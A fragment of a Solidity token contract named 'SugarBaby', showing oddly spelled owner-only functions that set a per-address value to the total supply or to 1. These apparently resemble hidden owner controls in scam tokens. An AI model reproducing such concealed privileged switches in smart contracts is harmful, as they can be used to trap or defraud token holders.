...
contract token is Ownable, IERC20 {
    ...
    string private _symbol = "SugarBaby";
    ...
    function SetaClam(address acddount) public onlyowner {
        _aClam[acddount] = _totalSupply;
    }


    function UnaClam(address acddount) public onlyowner {
        _aClam[acddount] = 1;
    }


    function isaClam(address acddount) public view returns (uint256) {
        return _aClam[acddount];
    }
